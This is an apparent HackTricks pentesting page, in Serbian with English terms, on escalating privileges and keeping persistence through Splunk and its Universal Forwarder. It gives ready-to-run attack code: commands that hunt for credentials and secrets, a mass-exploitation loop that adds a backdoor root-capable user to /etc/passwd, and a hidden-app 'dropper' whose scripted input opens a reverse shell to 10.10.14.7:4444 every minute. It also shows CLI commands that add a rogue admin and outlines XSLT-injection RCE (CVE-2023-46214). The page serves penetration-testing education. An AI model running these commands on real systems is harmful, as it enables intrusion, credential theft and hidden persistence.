# Splunk LPE i Persistence

{{#include ../../banners/hacktricks-training.md}}

Ako prilikom **enumerating** mašine **internally** ili **externally** pronađete da je **Splunk running** (obično **8000** za web UI i **8089** za management API), važeći credentials se često mogu pretvoriti u **code execution** putem instalacije aplikacija, scripted inputs ili management actions. Ako Splunk radi kao **root**, to često odmah dovodi do **privilege escalation**.

Ako vam je potreban samo generički remote attack surface, enumeration ili app-upload RCE path, pogledajte:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Ako ste **already root** i Splunk service ne osluškuje samo na localhost-u, takođe možete ukrasti **Splunk password hashes**, oporaviti **encrypted secrets** ili postaviti **malicious app** kako biste održali persistence lokalno ili na više forwardera.

## Zanimljive lokalne datoteke

Kada pristupite hostu na kojem radi Splunk ili Splunk Universal Forwarder, ovo su obično najzanimljivije putanje:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Važni artefakti:

- **`$SPLUNK_HOME/etc/passwd`**: lokalni Splunk korisnici i hash-evi lozinki.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: ključ koji Splunk koristi za šifrovanje secrets sačuvanih u nekoliko `.conf` fajlova.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: početni admin bootstrap fajl; koristan kod gold image-a i grešaka pri provisioningu. Ignoriše se ako `etc/passwd` već postoji.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mesto gde se scripted inputs najčešće omogućavaju.
- **`$SPLUNK_HOME/etc/deployment-apps/`** ili **`$SPLUNK_HOME/etc/apps/`**: dobra mesta za skrivanje persistent app-a ili pregled onoga što se već distribuira.

## Splunk Universal Forwarder Agent Exploit Summary

Za više detalja pogledajte [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo sažetak:<sup>[[1]](#references)</sup>

**Pregled exploita:**
Exploit koji cilja Splunk Universal Forwarder (UF) omogućava attackerima sa **agent password-om** da izvrše proizvoljan kod na sistemima koji koriste agent, potencijalno kompromitujući veliki deo environment-a.

**Zašto funkcioniše:**

- UF management service je često izložen na **TCP 8089**.
- Attackeri mogu da se autentifikuju na API i nalože forwarderu da instalira **malicious app bundle**.
- Isti primitive može da se koristi lokalno za **LPE** ili udaljeno za **RCE**.
- Javno dostupni alati kao što je **SplunkWhisperer2** automatski kreiraju app bundle i mogu da prilagode payload-e za Linux targets.

**Uobičajeni načini za pronalaženje password-a:**

- Credentials u cleartext-u u dokumentaciji, skriptama, share-ovima ili deployment automation-u.
- Password hash-evi unutar `$SPLUNK_HOME/etc/passwd`, nakon čega sledi offline cracking.
- Golden image-i ili ostaci provisioninga kao što je `user-seed.conf`.

**Uticaj:**

- Izvršavanje koda sa SYSTEM/root privilegijama na svakom kompromitovanom hostu.
- Deployment persistent app-ova, backdoor-a ili ransomware-a.
- Onemogućavanje ili manipulisanje telemetry podacima pre njihovog prosleđivanja.

**Primer komande za exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Javno dostupni exploit-i:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence putem Scripted Inputs ili Malicious Apps

Ako imate **filesystem write access** kao `root`/`splunk`, ili autentifikovani pristup za instaliranje app-ova, veoma pouzdan persistence mehanizam jeste postavljanje **custom app-a** sa **scripted input-om**.<sup>[[2]](#references)</sup> Splunk-ova dokumentacija očekuje da se scripted inputs nalaze u direktorijumu app-a i da budu omogućeni iz `inputs.conf`.

Tipična struktura:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimalni `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Brzi Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Napomene:

- Isti trik funkcioniše i na **Universal Forwarder** koristeći `/opt/splunkforwarder/etc/apps/`.
- Napadači se često uklope tako što izmene legitimni add-on umesto da kreiraju očigledno zlonamernu aplikaciju.
- Na **deployment server-u**, postavljanje zlonamerne aplikacije unutar `deployment-apps/` pretvara se u **fleet-wide persistence**, jer forwarderi periodično proveravaju, preuzimaju ažurirane aplikacije i često se ponovo pokreću da bi ih primenili.

## Krađa akreditiva i preuzimanje administratorskog naloga

Ako možete da čitate lokalne datoteke programa Splunk, obično postoje dva dobra cilja: povratiti **Splunk admin pristup** i povratiti **šifrovane akreditive servisa**.

### Hash-evi lozinki i lokalni korisnici

Splunk čuva podatke lokalne autentikacije u `etc/passwd`. U zavisnosti od deployment-a, razbijanje tog fajla može povratiti važeće akreditive za web UI i management API.

Ako već imate važeće **admin** akreditive i Splunk koristi svoj **native** authentication backend, sam CLI može da se koristi za persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` i šifrovane vrednosti

Splunk koristi `etc/auth/splunk.secret` za zaštitu osetljivih vrednosti sačuvanih u više konfiguracionih datoteka. Ako možete da ukradete i **secret** i relevantne **`.conf` datoteke**, često možete da povratite ili ponovo iskoristite:

- deljene secrets vrednosti između forwarder/indexer komponenti, kao što je `pass4SymmKey`
- lozinke privatnih TLS ključeva, kao što je `sslPassword`
- LDAP bind kredencijale, kao što je `bindDNPassword`

Ovo je korisno za **lateral movement**, čak i kada sama Splunk admin lozinka ne može da se crack-uje.

### Zloupotreba `user-seed.conf`

`user-seed.conf` se koristi samo pri prvom pokretanju ili kada `etc/passwd` ne postoji. Zbog toga je manje koristan na aktivnom sistemu, ali je veoma zanimljiv u:

- kompromitovanim installation template-ima
- container image-ovima
- workflow-ovima za unattended provisioning
- appliance uređajima gde se Splunk automatski ponovo inicijalizuje

U tim slučajevima, postavljanje vrednosti `HASHED_PASSWORD` generisane pomoću `splunk hash-passwd` daje vam tih način da ponovo dobijete admin pristup nakon redeployment-a.

## Zloupotreba Splunk upita

Za dodatne detalje pogledajte [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Korisna novija tehnika jeste zloupotreba **user-supplied XSLT-a** u ranjivim verzijama Splunk Enterprise-a, čime se account-u sa niskim privilegijama i validnom autentikacijom omogućava **OS command execution** u svojstvu korisnika `splunk`.

Tok na visokom nivou:

1. Autentikujte se na Splunk.
2. Otpremite maliciozni **XSL** fajl kroz funkcionalnost preview/upload.
3. Naterajte Splunk da prikaže rezultate pretrage koristeći otpremljeni stylesheet iz **dispatch** direktorijuma.
4. Iskoristite XSLT payload za upisivanje fajla ili pokretanje izvršavanja kroz Splunk-ov search pipeline (na primer, pristupanjem internoj funkcionalnosti kao što je `runshellscript`).

Važan zaključak za ofanzivnu stranu jeste da ovaj put omogućava **post-auth RCE bez potrebe za app upload-om**. Na Linux-u vas to obično dovodi do account-a **`splunk`**, koji je i dalje vredan jer taj korisnik često poseduje application tree, može da čita secrets i može da postavi persistent apps koje preživljavaju gubitak shell-a.

Reprezentativna putanja korišćena tokom exploitation-a je:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Ako Splunk radi sa previše privilegija ili ako korisnik `splunk` ima pristup opasnim skriptama, servisnim jedinicama koje se mogu menjati ili lošim `sudo` pravilima, ovo postaje čist **LPE** lanac.

## Reference

- [1] [Abusing Splunk Forwarders For RCE And Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Beware of TraitorWare: Using Splunk for Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
